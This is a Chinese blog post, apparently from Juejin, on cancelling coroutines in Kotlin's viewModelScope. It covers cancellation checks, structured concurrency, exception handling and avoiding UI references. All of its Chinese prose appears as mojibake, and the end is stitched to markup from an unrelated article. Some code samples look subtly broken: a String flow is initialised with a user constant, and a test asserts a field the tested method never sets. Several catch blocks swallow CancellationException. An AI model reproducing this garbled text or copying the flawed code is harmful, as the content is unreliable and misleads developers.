<p>å¦‚æœä½¿ç”¨ <code>Kotlin</code> åç¨‹ï¼Œå¤§æ¦‚ç‡å¯¹ <code>viewModelScope</code> å¹¶ä¸é™Œç”Ÿã€‚</p>
<p>å®ƒæ˜¯å°†åç¨‹ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸç»‘å®šçš„ç»ä½³å·¥å…·ï¼Œä½†å¦‚æœå–æ¶ˆæ“ä½œå¤„ç†ä¸å½“ï¼Œéº»çƒ¦ä¾¿ä¼šæ¥è¸µè€Œè‡³ã€‚</p>
<p>æ³„æ¼çš„åç¨‹ä¼šæŒç»­å ç”¨èµ„æºã€æµªè´¹ <code>CPU</code> ç®—åŠ›ï¼Œæ›´ç³Ÿçš„æ˜¯ï¼Œè¿˜å¯èƒ½å¯¼è‡´åº”ç”¨è¡Œä¸ºå¼‚å¸¸ã€‚</p>
<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†åˆ†äº«è‡ªå·±æ‘¸ç´¢å‡ºçš„ <code>viewModelScope</code> å–æ¶ˆæ“ä½œå®æˆ˜ç»éªŒï¼Œç»“åˆå…·ä½“ç¤ºä¾‹å’ŒæŠ€å·§ï¼Œé¿å…è¢«â€œxxä¸‡äººxâ€ã€‚</p>
<h2 data-id="heading-1">ä¸ºä½•å–æ¶ˆæ“ä½œè‡³å…³é‡è¦</h2>
<p><code>viewModelScope</code> æ˜¯ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸç»‘å®šçš„åç¨‹ä½œç”¨åŸŸã€‚</p>
<p>å½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼ˆæ¯”å¦‚å…³è”çš„ <code>Activity</code> æˆ– <code>Fragment</code> é”€æ¯ï¼‰ï¼Œè¯¥ä½œç”¨åŸŸä¼šè‡ªåŠ¨å–æ¶ˆæ‰€æœ‰å…³è”çš„åç¨‹ã€‚</p>
<p>å¬èµ·æ¥å¾ˆå®Œç¾ï¼Ÿ</p>
<p>ä½†å…³é”®é—®é¢˜åœ¨äºï¼šè‡ªåŠ¨å–æ¶ˆä¸ä»£è¡¨å¯ä»¥é«˜æ•æ— å¿§ã€‚ç¨ä¸æ³¨æ„ï¼Œåç¨‹ä»å¯èƒ½è¶…æ—¶è¿è¡Œã€å ç”¨èµ„æºï¼Œæˆ–è§¦å‘æœªæ•è·å¼‚å¸¸å¯¼è‡´åº”ç”¨å´©æºƒã€‚</p>
<p><em>è¿˜è®°å¾—ä¹‹å‰çš„æ–‡ç« çš„é‚£å¥è¯å—ï¼Ÿåç¨‹çš„å–æ¶ˆæ˜¯åä½œçš„ã€‚</em></p>
<p>è§„èŒƒçš„å–æ¶ˆæ“ä½œèƒ½ç¡®ä¿åº”ç”¨å§‹ç»ˆè½»é‡ã€è¡Œä¸ºå¯é¢„æµ‹ï¼Œå°¤å…¶æ˜¯åœ¨é…ç½®å˜æ›´æˆ–è¿›ç¨‹ç»ˆæ­¢çš„åœºæ™¯ä¸‹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬èŠèŠå¦‚ä½•ä¸“ä¸šåœ°ç®¡ç† <code>viewModelScope</code> çš„å–æ¶ˆé€»è¾‘ã€‚</p>
<h2 data-id="heading-2">ç†è§£ viewModelScope</h2>
<p><code>viewModelScope</code> æ˜¯ <code>androidx.lifecycle:lifecycle-viewmodel-ktx</code> åº“æä¾›çš„å±æ€§ï¼Œæœ¬è´¨æ˜¯ç»‘å®šåˆ° <code>Dispatchers.Main</code> ä¸»çº¿ç¨‹ã€ä¸”ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸå…³è”çš„ <code>CoroutineScope</code>ã€‚</p>
<p>å½“ <code>ViewModel</code> çš„ <code>onCleared()</code> æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¯¥ä½œç”¨åŸŸä¼šå–æ¶ˆæ‰€æœ‰åç¨‹ã€‚</p>
<p>è¿™å¯¹ <code>Android</code> å¼€å‘è€Œè¨€å ªç§°ç»é…â€”â€”æ¯•ç«Ÿ <code>UI</code> ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸæœ¬å°±å¤šå˜ï¼Œä½†è¿™ä¸€åˆ‡çš„å‰ææ˜¯ï¼Œä½ ç¼–å†™çš„ä»£ç è¦å…·å¤‡â€œå–æ¶ˆæ„ŸçŸ¥â€èƒ½åŠ›ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>viewModelScope</code> çš„ç®€å• <code>ViewModel</code> ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchDataFromNetwork() <span class="hljs-comment">// æŒ‚èµ·å‡½æ•°</span>
            <span class="hljs-comment">// æ›´æ–°UI</span>
        }
    }
}
</code></pre>
<p>å½“ <code>ViewModel</code> è¢«é”€æ¯ï¼ˆæ¯”å¦‚ç”¨æˆ·è·³è½¬é¡µé¢ï¼‰ï¼Œåç¨‹ä¼šè¢«å–æ¶ˆã€‚</p>
<p>ä½†å¦‚æœ <code>fetchDataFromNetwork()</code> æ˜¯è€—æ—¶æ“ä½œï¼Œæƒ…å†µä¼šå¦‚ä½•ï¼Ÿ</p>
<h2 data-id="heading-3">å–æ¶ˆæ“ä½œä¸å½“çš„å¸¸è§é™·é˜±</h2>
<p>åœ¨æˆ‘æ—©æœŸçš„é¡¹ç›®ä¸­ï¼Œæˆ‘æ›¾ä»¥ä¸º <code>viewModelScope</code> èƒ½â€œé­”æ³•èˆ¬â€å¤„ç†æ‰€æœ‰é—®é¢˜ï¼Œå®é™…ä¸Šæ ¹æœ¬ä¸å¯èƒ½ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å…¸å‹å‘ï¼š</p>
<ol>
<li><strong>ä¸å¯å–æ¶ˆçš„æ“ä½œ</strong>ï¼šéƒ¨åˆ†æŒ‚èµ·å‡½æ•°ï¼ˆå¦‚ç¬¬ä¸‰æ–¹åº“è°ƒç”¨ï¼‰ä¸å“åº”å–æ¶ˆæŒ‡ä»¤ï¼Œå¯¼è‡´èµ„æºæŒç»­å ç”¨ã€‚æˆ–è€…ï¼Œä½ è°ƒç”¨çš„å‡½æ•°å°±æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œæ ¹æœ¬ä¸æ˜¯æŒ‚èµ·å‡½æ•°ï¼Œä¸å¯èƒ½å“åº”å–æ¶ˆæŒ‡ä»¤ï¼›</li>
<li><strong>èµ„æºæ³„æ¼</strong>ï¼šè‹¥åç¨‹æŒæœ‰ <code>Context</code> æˆ– <code>View</code> çš„å¼•ç”¨ï¼Œå³ä¾¿å–æ¶ˆåç¨‹ä¹Ÿæ— æ³•é‡Šæ”¾èµ„æºï¼Œæœ€ç»ˆå¼•å‘å†…å­˜æ³„æ¼ï¼›</li>
<li><strong>æœªæ•è·å¼‚å¸¸</strong>ï¼šåç¨‹å–æ¶ˆè¿‡ç¨‹ä¸­è‹¥æŠ›å‡ºæœªå¤„ç†çš„ <code>CancellationException</code>ï¼Œå¯èƒ½ç›´æ¥å¯¼è‡´åº”ç”¨å´©æºƒã€‚</li>
</ol>
<h2 data-id="heading-4">é¢˜å¤–è¯</h2>
<p>å…¶å®æ—©æœŸå¯¹äºçº¿ç¨‹æˆ‘ä¹Ÿæ˜¯è¿™ä¹ˆç†è§£çš„ï¼Œæˆ‘ä»¬ç¿»çœ‹ä¸€ä¸‹ç°åœ¨çš„ Java çº¿ç¨‹çš„æºç ï¼š</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Deprecated(
    since = "1.2",
    forRemoval = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interrupt</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> != currentThread()) {
        <span class="hljs-built_in">this</span>.checkAccess();
    }

    <span class="hljs-built_in">this</span>.interrupted = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.interrupt0();
    <span class="hljs-comment">//...</span>
}
</code></pre>
<p><code>stop</code> å·²ç»æ˜¯ä¸€ä¸ªå¼ƒç”¨ä¸”ä¸å¯ç”¨çš„æ¥å£äº†ã€‚</p>
<p>åˆšå­¦ Java çš„æˆ‘ä¸€ç›´ä»¥ä¸ºï¼Œå¦‚æœæˆ‘è°ƒç”¨ <code>stop</code> æˆ–è€… <code>interrupt</code>ï¼ŒJava ä¸€å®šä¼šå®Œç¾çš„å¸®æˆ‘å–æ¶ˆçº¿ç¨‹ï¼Œé‡Šæ”¾èµ„æºã€‚ä½†å®é™…ä¸Šæˆ‘ä»¬éœ€è¦å†™é¢å¤–çš„ä»£ç æ¥è¾¾æˆè¿™ä¸€æ­¥ï¼Œä¾‹å¦‚åˆ¤æ–­ <code>interrupted</code> æ ‡å¿—ä½ã€‚</p>
<p>é¢˜å¤–è¯ç»“æŸï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è§£å†³å–æ¶ˆæ“ä½œä¸å½“çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">ç¼–å†™æ”¯æŒå–æ¶ˆçš„æŒ‚èµ·å‡½æ•°</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4074f668c159463a8e31aeae9a229d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=CKTSF1VeJh4qxqWnP4AA7W0FRyg%3D" alt="1.png" loading="lazy"/></p>
<p><strong>å¹¶éæ‰€æœ‰æŒ‚èµ·å‡½æ•°éƒ½å¤©ç”Ÿæ”¯æŒå–æ¶ˆ</strong>ã€‚</p>
<p>å¦‚æœè°ƒç”¨çš„æ˜¯éæŒ‚èµ·çš„é˜»å¡å¼ <code>API</code>ï¼ˆå¦‚é—ç•™åº“ï¼‰ï¼Œéœ€é€šè¿‡åŒ…è£…è®©å…¶å“åº”å–æ¶ˆæŒ‡ä»¤ï¼Œå¯ä½¿ç”¨ <code>isActive</code> æˆ– <code>yield()</code> æ£€æŸ¥å–æ¶ˆçŠ¶æ€ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æ”¯æŒå–æ¶ˆçš„æŒ‚èµ·å‡½æ•°ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataFromNetwork</span><span class="hljs-params">()</span></span>: String = withContext(Dispatchers.IO) {
    <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶ç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.10</span>) {
        <span class="hljs-keyword">if</span> (!isActive) <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> <span class="hljs-string">"å·²å–æ¶ˆ"</span> <span class="hljs-comment">// å–æ¶ˆåˆ™é€€å‡º</span>
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
    }
    <span class="hljs-string">"æ•°æ®è·å–æˆåŠŸ"</span>
}
</code></pre>
<p>è¯¥å‡½æ•°ä¸­ï¼Œ<code>isActive</code> ä¼šæ£€æŸ¥åç¨‹æ˜¯å¦ä»å¤„äºæ´»è·ƒçŠ¶æ€ã€‚å½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼Œ<code>isActive</code> å˜ä¸º <code>false</code>ï¼Œå‡½æ•°ä¼šæå‰é€€å‡ºã€‚</p>
<h2 data-id="heading-6">éµå¾ªç»“æ„åŒ–å¹¶å‘åŸåˆ™</h2>
<p><strong>ç»“æ„åŒ–å¹¶å‘èƒ½ç¡®ä¿å­åç¨‹éšçˆ¶ä½œç”¨åŸŸå–æ¶ˆè€Œå–æ¶ˆ</strong>ã€‚</p>
<p><code>viewModelScope</code> æœ¬èº«å·²éµå¾ªè¿™ä¸€åŸåˆ™ï¼Œä½†å¯åŠ¨åµŒå¥—åç¨‹æ—¶ä»éœ€åˆ»æ„æ³¨æ„ï¼šé¿å…ä½¿ç”¨ <code>GlobalScope</code>ï¼Œå› å…¶ä¸ç»‘å®šä»»ä½•ç”Ÿå‘½å‘¨æœŸï¼Œé€šå¸¸æ¯” <code>ViewModel</code> å­˜æ´»æ›´ä¹…ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _data = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: LiveData&lt;String&gt; = _data

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchMultipleData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> result1 = async { fetchDataFromNetwork() }.await()
                <span class="hljs-keyword">val</span> result2 = async { fetchDataFromNetwork() }.await()
                _data.value = <span class="hljs-string">"<span class="hljs-variable">$result1</span>, <span class="hljs-variable">$result2</span>"</span>
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _data.value = <span class="hljs-string">"æ“ä½œå·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _data.value = <span class="hljs-string">"é”™è¯¯ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>æ­¤å¤„çš„ <code>async</code> åç¨‹æ˜¯ <code>viewModelScope.launch</code> ä»£ç å—çš„å­åç¨‹ï¼Œå½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼Œæ‰€æœ‰å­åç¨‹ä¼šè‡ªåŠ¨å–æ¶ˆã€‚</p>
<p><em>é’ˆå¯¹ <code>CancellationException</code> çš„æ­£ç¡®åšæ³•åº”è¯¥æ˜¯é‡æ–°æŠ›å‡ºï¼Œä¸è¿‡è¿™é‡Œåªæ˜¯ä¸ºäº†å±•ç¤ºå½“å‰å‡½æ•°çš„å–æ¶ˆé€»è¾‘ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™ä¹ˆåšï¼Œæ–‡ç« çš„åç»­éƒ¨åˆ†å°†ä¾ç„¶é‡‡ç”¨è¿™ç§åšæ³•ï¼Œä½†æ˜¯äº²çˆ±çš„è¯»è€…ä»¬ï¼Œä½ ä»¬è¦çŸ¥é“è¿™ä¸ªåœ°æ–¹è¿™ä¹ˆåšæ˜¯æœ‰å¾…å•†æ¦·çš„ã€‚</em></p>
<h2 data-id="heading-7">å¤„ç†å–æ¶ˆå¼‚å¸¸</h2>
<p>åç¨‹å–æ¶ˆæ—¶ä¼šæŠ›å‡º <code>CancellationException</code>ï¼Œè¿™æ˜¯æ­£å¸¸è¡Œä¸ºï¼Œä½†å¿…é¡»å¦¥å–„å¤„ç†ä»¥é¿å…æ„å¤–å´©æºƒã€‚å»ºè®®å§‹ç»ˆå°†åç¨‹ä»£ç åŒ…è£¹åœ¨ <code>try-catch</code> å—ä¸­ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _status = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> status: LiveData&lt;String&gt; = _status

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performLongRunningTask</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                _status.value = withContext(Dispatchers.IO) {
                    <span class="hljs-comment">// è€—æ—¶ä»»åŠ¡</span>
                    delay(<span class="hljs-number">5000</span>)
                    <span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>
                }
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _status.value = <span class="hljs-string">"ä»»åŠ¡å·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _status.value = <span class="hljs-string">"é”™è¯¯ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>è¿™èƒ½ç¡®ä¿ <code>ViewModel</code> é”€æ¯æ—¶ï¼Œåº”ç”¨ä¼˜é›…å¤„ç†å–æ¶ˆæ“ä½œï¼Œå¹¶åŒæ­¥æ›´æ–° <code>UI</code> çŠ¶æ€ã€‚</p>
<h2 data-id="heading-8">é¿å…æŒæœ‰ UI ç»„ä»¶å¼•ç”¨</h2>
<p><code>viewModelScope</code> ä¸­çš„åç¨‹è‹¥ä¸æ…æŒæœ‰ <code>Activity</code> æˆ– <code>Fragment</code> çš„å¼•ç”¨ï¼Œææ˜“å¼•å‘å†…å­˜æ³„æ¼ã€‚</p>
<p>æ¯”å¦‚å‘æŒ‚èµ·å‡½æ•°ä¼ é€’ <code>Context</code>ï¼Œå¯èƒ½å¯¼è‡´<code>Activity</code> åœ¨å–æ¶ˆåä»æ— æ³•é‡Šæ”¾ã€‚å»ºè®®æ”¹ç”¨ä¾èµ–æ³¨å…¥ï¼Œæˆ–æ˜¾å¼ä¼ é€’æ•°æ®ã€‚</p>
<p>âŒ é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">badFetch</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-comment">// æŒæœ‰Activityå¼•ç”¨æ˜“å¯¼è‡´æ³„æ¼</span>
            activity.showToast(fetchDataFromNetwork())
        }
    }
}
</code></pre>
<p>âœ… ä¼˜åŒ–æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _toastMessage = MutableStateFlow&lt;String&gt;(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> toastMessage: Flow&lt;String&gt; = _toastMessage

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchAndNotify</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            _toastMessage.value = fetchDataFromNetwork()
        }
    }
}
</code></pre>
<p>åœ¨ <code>Activity</code> ä¸­è§‚å¯Ÿ <code>toastMessage</code> å¹¶æ˜¾ç¤ºå¼¹çª—ï¼Œå®ç°åç¨‹ä¸ <code>UI</code> è§£è€¦ã€‚</p>
<h2 data-id="heading-9">æµ‹è¯•å–æ¶ˆè¡Œä¸º</h2>
<p>å–æ¶ˆé€»è¾‘çš„æµ‹è¯•è™½æœ‰éš¾åº¦ï¼Œä½†è‡³å…³é‡è¦ã€‚å¯ä½¿ç”¨ <code>kotlinx-coroutines-test</code> åº“çš„ <code>runBlockingTest</code> æ¨¡æ‹Ÿå•å…ƒæµ‹è¯•ä¸­çš„å–æ¶ˆåœºæ™¯ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> `fetchData cancels correctly`<span class="hljs-params">()</span></span> = runBlockingTest {
    <span class="hljs-keyword">val</span> viewModel = MyViewModel()
    <span class="hljs-keyword">val</span> job = viewModel.viewModelScope.launch {
        viewModel.fetchData()
    }
    job.cancel()
    assertEquals(<span class="hljs-string">"ä»»åŠ¡å·²å–æ¶ˆ"</span>, viewModel.status.value)
}
</code></pre>
<p>è¿™èƒ½ç¡®ä¿åç¨‹å–æ¶ˆæ—¶èƒ½æ­£ç¡®æ¸…ç†èµ„æºã€‚</p>
<h2 data-id="heading-10">å®æˆ˜</h2>
<p>å¦‚æœéœ€æ±‚éœ€è¦å®ç°â€œè·å–ç”¨æˆ·æ•°æ® â†’ å¤„ç†æ•°æ® â†’ æ›´æ–° <code>UI</code>â€çš„æµç¨‹ï¼ŒåŒæ—¶è¦é€‚é…é…ç½®å˜æ›´å’Œæ½œåœ¨çš„å–æ¶ˆæ“ä½œï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªå…¸å‹çš„å®ç°æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiService: ApiService) : ViewModel() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _userData = MutableStateFlow&lt;User&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> userData: Flow&lt;User&gt; = _userData
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _error = MutableStateFlow&lt;String&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> error: Flow&lt;String&gt; = _error

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserProfile</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> user = withContext(Dispatchers.IO) {
                    ensureActive() <span class="hljs-comment">// æ‰§è¡Œå‰æ£€æŸ¥å–æ¶ˆçŠ¶æ€</span>
                    <span class="hljs-keyword">val</span> rawData = apiService.getUser(userId)
                    processUserData(rawData) <span class="hljs-comment">// è€—æ—¶å¤„ç†æ“ä½œ</span>
                }
                _userData.value = user
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _error.value = <span class="hljs-string">"ç”¨æˆ·æ•°æ®è·å–å·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _error.value = <span class="hljs-string">"è·å–ç”¨æˆ·æ•°æ®å¤±è´¥ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processUserData</span><span class="hljs-params">(rawData: <span class="hljs-type">RawUserData</span>)</span></span>: User {
        <span class="hljs-keyword">return</span> withContext(Dispatchers.Default) {
            ensureActive() <span class="hljs-comment">// å¤„ç†è¿‡ç¨‹ä¸­æ£€æŸ¥å–æ¶ˆçŠ¶æ€</span>
            <span class="hljs-comment">// æ¨¡æ‹Ÿå¤æ‚æ•°æ®å¤„ç†</span>
            delay(<span class="hljs-number">2000</span>)
            User(rawData.id, rawData.name)
        }
    }
}
</code></pre>
<p>æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ul>
<li><code>ensureActive()</code> ä¼šåœ¨åç¨‹å–æ¶ˆæ—¶æŠ›å‡º <code>CancellationException</code>ï¼Œè®©å‡½æ•°å…·å¤‡å–æ¶ˆæ„ŸçŸ¥èƒ½åŠ›ï¼›</li>
<li><code>Dispatchers.IO</code> å’Œ <code>Dispatchers.Default</code> ç¡®ä¿è€—æ—¶æ“ä½œè„±ç¦»ä¸»çº¿ç¨‹ï¼›</li>
<li>é€šè¿‡ <code>Flow</code> ä¼ é€’é”™è¯¯å’Œå–æ¶ˆçŠ¶æ€ï¼Œä¿æŒ <code>UI</code> åŒæ­¥ã€‚</li>
</ul>
<h2 data-id="heading-11">é¿å‘æŒ‡å—</h2>
<ol>
<li><strong>å¿½ç•¥å–æ¶ˆæ£€æŸ¥</strong>ï¼šè€—æ—¶æŒ‚èµ·å‡½æ•°ä¸­åŠ¡å¿…é€šè¿‡ <code>isActive</code> æˆ– <code>ensureActive()</code> æ£€æŸ¥å–æ¶ˆçŠ¶æ€ï¼›</li>
<li><strong>æ»¥ç”¨ GlobalScope</strong>ï¼šåšæŒä½¿ç”¨ <code>viewModelScope</code>ï¼Œç¡®ä¿åç¨‹ä¸ç”Ÿå‘½å‘¨æœŸç»‘å®šã€‚å¦‚æœä½ çš„ä»£ç ä¸­å‡ºç°äº† <code>GlobalScope</code>ï¼Œä½ çš„ä»£ç ä¸€å®šæœ‰é—®é¢˜ï¼›</li>
<li><strong>å¿˜è®°å¤„ç†å¼‚å¸¸</strong>ï¼šåŠ¡å¿…å°† <code>CancellationException</code> ä¸å…¶ä»–å¼‚å¸¸åˆ†å¼€æ•è·ï¼Œæ›´é€šç”¨çš„åšæ³•å°±æ˜¯é‡æ–°æŠ›å‡ºï¼›</li>
<li><strong>é˜»å¡ä¸»çº¿ç¨‹</strong>ï¼šé <code>UI</code> æ“ä½œéœ€é€šè¿‡ <code>withContext</code> åˆ‡æ¢åˆ°åˆé€‚çš„è°ƒåº¦å™¨ã€‚</li>
</ol>
<h2 data-id="heading-12">æ€»ç»“</h2>
<p>æŒæ¡ <code>viewModelScope</code> å–æ¶ˆæ“ä½œçš„æ ¸å¿ƒï¼Œåœ¨äºç†è§£ç”Ÿå‘½å‘¨æœŸã€ç¼–å†™æ”¯æŒå–æ¶ˆçš„ä»£ç ï¼Œå¹¶ä¼˜é›…å¤„ç†è¾¹ç•Œæƒ…å†µã€‚</p>
<p>éµå¾ªè¿™äº›æœ€ä½³å®è·µâ€”â€”ç¼–å†™åä½œå¼æŒ‚èµ·å‡½æ•°ã€åˆ©ç”¨ç»“æ„åŒ–å¹¶å‘ã€å¦¥å–„å¤„ç†å¼‚å¸¸ã€é¿å…æŒæœ‰ <code>UI</code> å¼•ç”¨ï¼Œä½ å°±èƒ½å¼€å‘å‡ºå¥å£®ä¸”é«˜æ•ˆçš„ <code>Android</code> åº”ç”¨ã€‚</p>
<p>ä¸‹æ¬¡é‡åˆ°è«åçš„å†…å­˜æ³„æ¼æˆ–å´©æºƒæ—¶ï¼Œä¸å¦¨æ£€æŸ¥ä¸€ä¸‹åç¨‹ï¼šå¾€å¾€åªéœ€åšå¥½å–æ¶ˆå¤„ç†ï¼Œå°±èƒ½è§£å†³é—®é¢˜ã€‚</p>
<p>æˆ‘é©¬ä¸ŠæŠŠè¿™ç¯‡æ–‡ç« å‘ç»™æˆ‘çš„åŒäº‹ï¼Œå…å¾—åæ‚£æ— ç©·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Codex App å‘å¸ƒï¼šè‡ªåŠ¨åŒ– + Skillsï¼Œè®©å·¥ä½œäº¤ç»™æ™ºèƒ½ä½“]]></title>    <link>https://juejin.cn/post/7602553969970675766</link>    <guid>https://juejin.cn/post/7602553969970675766</guid>    <pubDate>2026-02-04T08:56:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602553969970675766" data-draft-id="7602553969970659382" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Codex App å‘å¸ƒï¼šè‡ªåŠ¨åŒ– + Skillsï¼Œè®©å·¥ä½œäº¤ç»™æ™ºèƒ½ä½“"/> <meta itemprop="keywords" content="åç«¯,ç¨‹åºå‘˜,äº§å“"/> <meta itemprop="datePublished" content="2026-02-04T08:56:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‘†çƒ‚å·¥ç¨‹å¸ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1552933235470589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Codex App å‘å¸ƒï¼šè‡ªåŠ¨åŒ– + Skillsï¼Œè®©å·¥ä½œäº¤ç»™æ™ºèƒ½ä½“
